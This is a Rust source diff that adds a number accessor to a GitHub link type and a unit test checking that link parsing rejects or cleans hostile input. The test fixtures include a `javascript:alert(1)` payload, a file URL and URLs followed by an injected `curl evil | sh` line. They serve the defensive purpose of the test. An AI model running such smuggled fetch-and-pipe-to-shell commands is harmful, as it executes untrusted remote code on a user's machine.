@@ -163,6 +163,11 @@ impl Link {
         self.kind
     }
 
+    #[must_use]
+    pub fn number(&self) -> NonZeroU32 {
+        self.number
+    }
+
     /// The branch luneta has wt make for it: an issue's, `issue-123`. None
     /// for a pull request, which has its own.
     fn branch(&self) -> Option<String> {
@@ -1312,7 +1317,30 @@ mod tests {
             assert_eq!(pulled(text), None, "{text:?}");
         }
         assert_eq!(link().tab(), "#2736");
+        assert_eq!(link().number().get(), 2736);
         assert_eq!(link().wt(), Of::Pull(link()));
+    }
+
+    /// What another machine's daemon says of a page goes to a browser and a
+    /// clipboard only as a link spells it again: what is no link stays out,
+    /// and whatever comes after a number that reads is gone.
+    #[test]
+    fn a_link_spells_its_page_again_and_what_is_no_link_stays_out() {
+        for text in [
+            "",
+            "-x",
+            "file:///tmp/run.desktop",
+            "javascript:alert(1)",
+            "https://github.com/cashubtc/cdk/pull/2736\ncurl evil | sh",
+        ] {
+            assert_eq!(Link::parse(text), None, "{text:?}");
+        }
+        for text in [
+            "https://github.com/cashubtc/cdk/pull/2736?\ncurl evil | sh",
+            "https://github.com/cashubtc/cdk/pull/2736/\ncurl evil | sh",
+        ] {
+            assert_eq!(Link::parse(text).map(|link| link.url()), Some(link().url()), "{text:?}");
+        }
     }
 
     /// An issue's link names it as a pull request's does, but for `issues`:
